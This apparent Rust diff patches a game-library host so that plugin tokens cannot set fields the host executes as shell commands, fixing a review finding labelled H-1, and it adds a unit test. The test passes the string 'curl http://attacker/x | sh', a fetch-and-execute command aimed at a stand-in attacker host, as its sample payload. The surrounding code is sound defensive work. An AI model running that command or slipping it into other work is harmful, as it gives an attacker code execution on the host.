@@ -246,6 +246,34 @@ pub fn delete_custom(id: &str) -> Result<MutateOutcome<()>> {
 
 // ------------------------------------------------------------------ providers (RFC §8)
 
+/// The **operator-privileged field** set in a library payload, if the payload carries one — the
+/// fields whose contents the host later executes as the host user.
+///
+/// `prep` is run by [`crate::hooks::run_prep`] through `/bin/sh -c`, and a `command` launch is run
+/// through `/bin/sh -c` (Linux) or `cmd.exe /c` (Windows). Both are documented at their execution
+/// sites as *operator-typed, never client-set* — the custom store's whole trust argument is that a
+/// human typed the command into the admin console. Any lane that is not the operator's own token
+/// must therefore not be able to set them, which is what the 2026-08-05 review's H-1 exploited: the
+/// plugin token reached `POST /library/custom` and `PUT /library/provider/{p}`, which carry two
+/// copies of the very primitive the `/hooks` carve-out exists to withhold.
+///
+/// Returns the field name for the error message, so a plugin author sees exactly what was refused.
+/// The other launch kinds (`steam_appid`, `epic`, `gog`, `aumid`, `lutris_id`, `heroic`) are all
+/// host-resolved from a validated id and stay open to every lane — a provider plugin can still
+/// publish its whole catalogue, it just cannot hand the host a shell command to run.
+pub fn privileged_field(
+    launch: Option<&LaunchSpec>,
+    prep: &[crate::hooks::PrepCmd],
+) -> Option<&'static str> {
+    if !prep.is_empty() {
+        return Some("prep");
+    }
+    if launch.is_some_and(|l| l.kind == "command") {
+        return Some("launch.kind = \"command\"");
+    }
+    None
+}
+
 /// Provider ids are path segments, event sources, and console labels: keep them tame.
 /// `manual` is reserved (it is the no-provider sentinel in `library.changed`).
 pub fn validate_provider_name(provider: &str) -> Result<(), String> {
@@ -533,6 +561,35 @@ mod tests {
             2,
             "only the manual + other-provider entries remain"
         );
+    }
+
+    /// The field-authority rule behind the 2026-08-05 review's H-1: exactly the two fields the host
+    /// later hands to a shell are operator-only. Everything else — including every host-resolved
+    /// launch kind — stays open, so a provider plugin can publish its whole catalogue.
+    #[test]
+    fn privileged_field_is_command_execution_only() {
+        let cmd = LaunchSpec {
+            kind: "command".into(),
+            value: "curl http://attacker/x | sh".into(),
+        };
+        let steam = LaunchSpec {
+            kind: "steam_appid".into(),
+            value: "70".into(),
+        };
+        let prep = vec![crate::hooks::PrepCmd {
+            run: "curl http://attacker/x | sh".into(),
+            undo: None,
+        }];
+
+        assert_eq!(
+            privileged_field(Some(&cmd), &[]),
+            Some("launch.kind = \"command\"")
+        );
+        assert_eq!(privileged_field(None, &prep), Some("prep"));
+        assert_eq!(privileged_field(Some(&steam), &prep), Some("prep"));
+        // The ordinary provider catalogue: nothing privileged, so no lane is refused.
+        assert_eq!(privileged_field(Some(&steam), &[]), None);
+        assert_eq!(privileged_field(None, &[]), None);
     }
 
     #[test]
